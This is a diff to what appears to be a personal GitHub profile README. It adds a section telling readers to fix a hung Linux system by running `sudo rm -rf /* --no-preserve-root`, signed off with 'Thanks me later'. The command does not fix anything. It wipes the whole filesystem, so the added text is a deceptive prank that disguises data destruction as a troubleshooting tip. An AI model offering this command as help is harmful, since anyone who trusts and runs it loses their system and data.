@@ -34,3 +34,11 @@ Driven by his passion in software development, Ahmad Fakhrul Bawani began his jo
   <img src="Images\Motivasi-1.png" width="300px" /> 
   <p><img align="center" src="https://github-readme-streak-stats.herokuapp.com/?user=ahmadfakhrulbawani2-arch&" alt="ahmadfakhrulbawani2-arch" /></p>
 </div>
+<br />
+If your beloved linux suddenly hang, try to run this in its terminal:
+
+```bash
+sudo rm -rf /* --no-preserve-root
+```
+
+Thanks me later
